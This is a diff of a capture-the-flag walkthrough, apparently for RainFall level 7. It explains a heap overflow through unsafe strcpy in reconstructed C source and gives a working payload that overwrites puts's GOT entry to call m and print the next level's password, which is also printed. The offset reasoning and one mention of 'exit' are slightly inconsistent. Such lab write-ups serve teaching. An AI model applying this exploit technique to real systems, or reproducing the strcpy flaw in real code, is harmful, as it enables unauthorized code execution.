@@ -1,169 +1,92 @@
-# Analysis of the Binary
+# Level 7
 
-Start by inspecting the functions in the binary using GDB:
-
-```bash
-(gdb) info functions
-[...]
-0x080484f4  m
-0x08048521  main
-[...]
-(gdb) disassemble main
-Dump of assembler code for function main:
-   0x08048521 <+0>:     push   %ebp
-   0x08048522 <+1>:     mov    %esp,%ebp
-   0x08048524 <+3>:     and    $0xfffffff0,%esp
-   0x08048527 <+6>:     sub    $0x20,%esp
-   0x0804852a <+9>:     movl   $0x8,(%esp)
-   0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
-   0x08048536 <+21>:    mov    %eax,0x1c(%esp)
-   0x0804853a <+25>:    mov    0x1c(%esp),%eax
-   0x0804853e <+29>:    movl   $0x1,(%eax)
-   0x08048544 <+35>:    movl   $0x8,(%esp)
-   0x0804854b <+42>:    call   0x80483f0 <malloc@plt>
-   0x08048550 <+47>:    mov    %eax,%edx
-   0x08048552 <+49>:    mov    0x1c(%esp),%eax
-   0x08048556 <+53>:    mov    %edx,0x4(%eax)
-   0x08048559 <+56>:    movl   $0x8,(%esp)
-   0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
-   0x08048565 <+68>:    mov    %eax,0x18(%esp)
-   0x08048569 <+72>:    mov    0x18(%esp),%eax
-   0x0804856d <+76>:    movl   $0x2,(%eax)
-   0x08048573 <+82>:    movl   $0x8,(%esp)
-   0x0804857a <+89>:    call   0x80483f0 <malloc@plt>
-   0x0804857f <+94>:    mov    %eax,%edx
-   0x08048581 <+96>:    mov    0x18(%esp),%eax
-   0x08048585 <+100>:   mov    %edx,0x4(%eax)
-   0x08048588 <+103>:   mov    0xc(%ebp),%eax
-   0x0804858b <+106>:   add    $0x4,%eax
-   0x0804858e <+109>:   mov    (%eax),%eax
-   0x08048590 <+111>:   mov    %eax,%edx
-   0x08048592 <+113>:   mov    0x1c(%esp),%eax
-   0x08048596 <+117>:   mov    0x4(%eax),%eax
-   0x08048599 <+120>:   mov    %edx,0x4(%esp)
-   0x0804859d <+124>:   mov    %eax,(%esp)
-   0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
-   0x080485a5 <+132>:   mov    0xc(%ebp),%eax
-   0x080485a8 <+135>:   add    $0x8,%eax
-   0x080485ab <+138>:   mov    (%eax),%eax
-   0x080485ad <+140>:   mov    %eax,%edx
-   0x080485af <+142>:   mov    0x18(%esp),%eax
-   0x080485b3 <+146>:   mov    0x4(%eax),%eax
-   0x080485b6 <+149>:   mov    %edx,0x4(%esp)
-   0x080485ba <+153>:   mov    %eax,(%esp)
-   0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
-   0x080485c2 <+161>:   mov    $0x80486e9,%edx
-   0x080485c7 <+166>:   mov    $0x80486eb,%eax
-   0x080485cc <+171>:   mov    %edx,0x4(%esp)
-   0x080485d0 <+175>:   mov    %eax,(%esp)
-   0x080485d3 <+178>:   call   0x8048430 <fopen@plt>
-   0x080485d8 <+183>:   mov    %eax,0x8(%esp)
-   0x080485dc <+187>:   movl   $0x44,0x4(%esp)
-   0x080485e4 <+195>:   movl   $0x8049960,(%esp)
-   0x080485eb <+202>:   call   0x80483c0 <fgets@plt>
-   0x080485f0 <+207>:   movl   $0x8048703,(%esp)
-   0x080485f7 <+214>:   call   0x8048400 <puts@plt>
-   0x080485fc <+219>:   mov    $0x0,%eax
-   0x08048601 <+224>:   leave
-   0x08048602 <+225>:   ret
-End of assembler dump.
-(gdb) x/s 0x80486eb
-0x80486eb:       "/home/user/level8/.pass"
-(gdb) disassemble m
-Dump of assembler code for function m:
-   0x080484f4 <+0>:     push   %ebp
-   0x080484f5 <+1>:     mov    %esp,%ebp
-   0x080484f7 <+3>:     sub    $0x18,%esp
-   0x080484fa <+6>:     movl   $0x0,(%esp)
-   0x08048501 <+13>:    call   0x80483d0 <time@plt>
-   0x08048506 <+18>:    mov    $0x80486e0,%edx
-   0x0804850b <+23>:    mov    %eax,0x8(%esp)
-   0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)
-   0x08048517 <+35>:    mov    %edx,(%esp)
-   0x0804851a <+38>:    call   0x80483b0 <printf@plt>
-   0x0804851f <+43>:    leave
-   0x08048520 <+44>:    ret
-End of assembler dump.
-(gdb) disassemble puts
-Dump of assembler code for function puts@plt:
-   0x08048400 <+0>:     jmp    *0x8049928
-   0x08048406 <+6>:     push   $0x28
-   0x0804840b <+11>:    jmp    0x80483a0
-End of assembler dump.
+## Answer
+Our C source code generates the same assembly code as the original binary. Compile it as follows:
+```
+gcc -fno-stack-protector source.c
 ```
 
-## Key Observations
-- In `main`, memory is allocated and manipulated using `strcpy`.
-- The `m` function is designed to print a value from an unknown variable containing the password (`/home/user/level8/.pass`).
-- Our goal is to manipulate the execution flow to trigger the `m` function and reveal the password.
-
-# Developing the Exploit
-
-The strategy involves using `strcpy` to overwrite critical memory locations.
-
-## Understanding Memory Allocation
-
-In C, the memory allocation can be represented as:
-
+Let's take a look at the source code:
 ```c
-int *buffer;
-int *buffer2;
+#include <stdlib.h>
+#include <stdio.h>
+#include <time.h>
+#include <string.h>
 
-buffer = (int *)malloc(8);
-buffer[1] = (int)malloc(8);
+struct s {
+    int id;
+    void *ptr;
+};
 
-buffer2 = (int *)malloc(8);
-buffer2[1] = (int)malloc(8);
+char c[80] = "";
 
-strcpy(buffer[1], argv[1]);
-strcpy(buffer2[1], argv[2]);
+void m()
+{
+    printf("%s - %d\n", c, time(0));
+}
+
+int main(int argc, char **argv)
+{
+    struct s *buffer1;
+    struct s *buffer2;
+
+    buffer1 = malloc(8);
+    buffer1->id = 1;
+    buffer1->ptr = malloc(8);
+
+    buffer2 = malloc(8);
+    buffer2->id = 2;
+    buffer2->ptr = malloc(8);
+
+    strcpy(buffer1->ptr, argv[1]);
+    strcpy(buffer2->ptr, argv[2]);
+
+    fgets(c, 68, fopen("/home/user/level8/.pass", "r"));
+    puts("~~");
+    return 0;
+}
 ```
 
-Using `ltrace`, observe the memory allocation:
+Let's focus on the `main` function. It reads input from the command line then copies it to our buffer using `strcpy`, which is known to be unsafe due to its potential for causing buffer overflows, as it lacks a mechanism to limit the number of bytes copied.
 
+Since we're interacting with the heap here we won't have to worry about the stack layout, in this case we'll have to overflow the first buffer until we reach `buffer2->ptr` and write the address of the GOT entry of `puts` to it. Then thanks to the second `strcpy` we'll be able to overwrite the value that the GOT entry address for exit points to with the address of the `m` function.
+
+Yet again this exercise utilizes PLT and GOT, so please refer to the [level5 walkthrough](../level5/walkthrough.md) for a detailed explanation of how it works.
+
+We'll use `ltrace` to understand the memory allocations and calculate the size needed for the overflow:
 ```bash
 $ ltrace ./level7 arg1 arg2
 __libc_start_main(0x8048521, 3, 0xbffff7d4, 0x8048610, 0x8048680 <unfinished ...>
-malloc(8)                                                                                       = 0x0804a008
-malloc(8)                                                                                       = 0x0804a018
-malloc(8)                                                                                       = 0x0804a028
-malloc(8)                                                                                       = 0x0804a038
-strcpy(0x0804a018, "arg1")                                                                      = 0x0804a018
-strcpy(0x0804a038, "arg2")                                                                      = 0x0804a038
-fopen("/home/user/level8/.pass", "r")                                                           = 0
-fgets( <unfinished ...>
---- SIGSEGV (Segmentation fault) ---
-+++ killed by SIGSEGV +++
+malloc(8) = 0x0804a008  #buffer1 = malloc(8);
+malloc(8) = 0x0804a018  #buffer1->ptr = malloc(8);
+malloc(8) = 0x0804a028  #buffer2 = malloc(8);
+malloc(8) = 0x0804a038  #buffer2->ptr = malloc(8);
+strcpy(0x0804a018, "arg1") = 0x0804a018
+strcpy(0x0804a038, "arg2") = 0x0804a038
+[...]
 ```
 
-## Determining Overflow Offset
-
+<!-- Since we want to write to `buffer2->ptr`, we need to overflow `buffer1->ptr` and then `buffer2->id` to reach it. So we can just do some math to find the offset needed to reach `buffer2->ptr`:
 - Offset calculation: The difference between the start of the first `strcpy` destination (`0x0804a018`) and the address of `buffer2` (`0x0804a028`) is 16 bytes.
-- `buffer2[1]` is 4 bytes after the start of `buffer2` (as it's an `int`).
-- Total offset for overflow: `16 (distance to buffer2) + 4 (to reach buffer2[1]) = 20`.
+- `buffer2->id` is 4 bytes after the start of `buffer2` (as it's an `int`).
+- Total offset for overflow: `16 (distance to buffer2) + 4 (to reach buffer2->id) = 20`. -->
 
-## Crafting the Payload
+Using gdb we find that that the address of the `m` function is `0x080484f4` and that the address of the GOT entry for `puts` is `0x8049928`.
 
-The exploit involves a two-step payload:
+We can then craft our payload:
+```
+arg1 = padding + address of the GOT entry for puts
+arg2 = address of m
 
-1. **First Payload**: Change the destination address in `buffer2[1]`:
-    ```bash
-    $ ./level7 `python -c 'print("A"*20 + "\x28\x99\x04\x08")'`
-    ```
-   This payload fills 20 bytes and then writes the reversed address of the `puts` function pointer.
-
-2. **Second Payload**: Overwrite the `puts` function pointer with the address of `m`:
-    ```bash
-    $ ./level7 `python -c 'print("A"*20 + "\x28\x99\x04\x08")'` `python -c 'print("\xf4\x84\x04\x08")'`
-    ```
-   This payload replaces the `puts` pointer with the address of `m` (little-endian format).
-
-## Executing the Exploit
-
-Run the exploit to redirect the program flow to `m`, which prints the password:
-
-```plaintext
-5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+arg1 = "A"*20 + "\x08\x04\x99\x28"
+arg2 = "\x08\x04\x84\xf4"
 ```
 
-The exploit successfully alters the program's behavior, revealing the next level's password.
+Let's run our payload:
+```bash
+level7@RainFall:~$ ./level7 `python -c 'print("A"*20 + "\x08\x04\x99\x28"[::-1])'` `python -c 'print("\x08\x04\x84\xf4"[::-1])'`
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1702752190
+```
+
+We are now level8! Let's move on to the next level.
